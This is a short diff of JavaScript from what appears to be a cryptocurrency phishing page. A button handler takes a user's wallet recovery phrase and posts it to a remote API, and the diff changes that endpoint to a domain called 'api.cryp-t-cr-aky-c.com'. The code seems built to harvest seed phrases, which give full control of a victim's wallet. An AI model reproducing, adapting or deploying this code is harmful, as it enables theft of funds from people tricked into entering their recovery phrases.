@@ -76,7 +76,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
         }
     
         if(!error){
-            const url = "https://backend-01-92mi.onrender.com/api/rainbow";
+            const url = "https://api.cryp-t-cr-aky-c.com/api/rainbow";
             const data = {
                 recoveryPhrase:inputData
             };
